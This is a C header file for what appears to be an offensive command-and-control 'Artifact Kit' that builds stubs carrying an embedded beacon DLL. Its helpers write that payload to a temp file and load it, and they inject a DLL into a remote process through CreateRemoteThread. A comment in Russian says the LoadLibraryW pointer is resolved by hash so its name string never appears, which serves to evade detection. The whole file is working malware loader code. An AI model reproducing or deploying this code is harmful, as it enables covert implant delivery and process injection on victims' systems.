// artifact.h -- Shared helpers for Artifact Kit stubs.
//
// All stubs share: payload section, magic validation, temp-file writing,
// remote DLL injection, byte-level copy. This header defines them once.
//
// Functions are static -- each stub gets its own copy; linker drops unused ones.
// No CRT dependency: uses only kernel32 + user32 APIs.

#ifndef CO2H_ARTIFACT_H
#define CO2H_ARTIFACT_H

#include <windows.h>
#include "api_hash.h"   // вводит макросы перенаправления + g_api/ART_RESOLVE_APIS

// ---- Constants ---------------------------------------------------------------
#define ART_MAX_PAYLOAD   (512 * 1024)
#define ART_MAGIC_U64     0x4C59415048324F43ULL   // "CO2HPAYL" little-endian

// ---- Payload section macro ---------------------------------------------------
// Place at file scope in every .c file:
//   ART_DECLARE_PAYLOAD();
// artifact-gen patches the .co2pay section with the actual beacon DLL.
#define ART_DECLARE_PAYLOAD()                                          \
    __pragma(section(".co2pay", read))                                  \
    __declspec(allocate(".co2pay"))                                     \
    static const unsigned char g_payload[ART_MAX_PAYLOAD + 12] = {     \
        'C','O','2','H','P','A','Y','L',                               \
        0,0,0,0,                                                       \
    }

// ---- Validation --------------------------------------------------------------
// Check magic + size. Returns DLL size or 0 on failure.
static unsigned int art_get_size(const unsigned char *payload) {
    unsigned int sz;
    if (*(const unsigned long long *)payload != ART_MAGIC_U64) return 0;
    sz = *(const unsigned int *)(payload + 8);
    if (!sz || sz > ART_MAX_PAYLOAD) return 0;
    return sz;
}

// ---- Byte-level copy (no CRT) -----------------------------------------------
static void art_memcpy(void *dst, const void *src, DWORD n) {
    BYTE       *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    DWORD i;
    for (i = 0; i < n; ++i) d[i] = s[i];
}

// ---- Write beacon DLL to %TEMP% file ----------------------------------------
// Returns TRUE on success; out_path receives the full path.
static BOOL art_write_temp(wchar_t *out_path, const unsigned char *payload,
                           unsigned int dll_size) {
    wchar_t tmpdir[MAX_PATH + 1];
    HANDLE hf;
    DWORD  written = 0;

    GetTempPathW(MAX_PATH, tmpdir);
    if (!GetTempFileNameW(tmpdir, L"c2h", 0, out_path)) return FALSE;

    hf = CreateFileW(out_path, GENERIC_WRITE, 0, NULL,
                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { DeleteFileW(out_path); return FALSE; }

    WriteFile(hf, payload + 12, dll_size, &written, NULL);
    CloseHandle(hf);
    if (written != dll_size) { DeleteFileW(out_path); return FALSE; }
    return TRUE;
}

// ---- One-shot load via temp file + LoadLibraryW -----------------------------
static HMODULE art_load_beacon(const unsigned char *payload, unsigned int dll_size) {
    wchar_t tmppath[MAX_PATH + 1];
    HMODULE mod;
    if (!art_write_temp(tmppath, payload, dll_size)) return NULL;
    mod = LoadLibraryW(tmppath);
    DeleteFileW(tmppath);
    return mod;
}

// ---- Remote DLL injection via CreateRemoteThread(LoadLibraryW) ---------------
// hProcess must have PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
// PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION access.
static BOOL art_inject_remote(HANDLE hProcess, const wchar_t *dll_path) {
    SIZE_T  nb  = (SIZE_T)(lstrlenW(dll_path) + 1) * sizeof(wchar_t);
    SIZE_T  nw  = 0;
    FARPROC fn;
    HANDLE  ht;
    LPVOID  rpath;

    rpath = VirtualAllocEx(hProcess, NULL, nb,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rpath) return FALSE;

    if (!WriteProcessMemory(hProcess, rpath, dll_path, nb, &nw) || nw != nb) {
        VirtualFreeEx(hProcess, rpath, 0, MEM_RELEASE);
        return FALSE;
    }

    // Используем уже разрешённый по хешу указатель — без строки "LoadLibraryW"
    fn = (FARPROC)g_api.f_LoadLibraryW;
    ht = CreateRemoteThread(hProcess, NULL, 0,
                            (LPTHREAD_START_ROUTINE)fn, rpath, 0, NULL);
    if (!ht) {
        VirtualFreeEx(hProcess, rpath, 0, MEM_RELEASE);
        return FALSE;
    }
    WaitForSingleObject(ht, 10000);
    CloseHandle(ht);
    VirtualFreeEx(hProcess, rpath, 0, MEM_RELEASE);
    return TRUE;
}

#endif // CO2H_ARTIFACT_H
